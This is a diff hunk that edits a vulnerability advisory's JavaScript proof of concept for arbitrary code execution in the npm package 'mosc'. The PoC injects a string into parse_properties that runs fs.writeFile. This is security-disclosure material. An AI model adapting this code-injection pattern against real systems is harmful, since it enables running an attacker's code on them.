@@ -7,11 +7,11 @@ This package is vulnerable to Arbitrary Code Execution. User input provided to `
 # Proof of Concept
 
 ```
-var Mosc = require("mosc")
-var mosc = new Mosc({})
-var key = ""
-var attack*code = "fs=require('fs');fs.writeFile('FileName');"
-var properties = "{a:\_1*; " attack_code " //\*}"
+var A = require("mosc");
+var a = new A({});
+var key = "";
+var attack_code = "fs=require('fs');fs.writeFile('HACKED');"
+var properties = "{a:*1*; " + attack_code + " //*}"
 
-var mosc = mosc.parse_properties(key, properties, {}, {})
+var a = a.parse_properties(key,properties,{},{})
 ```
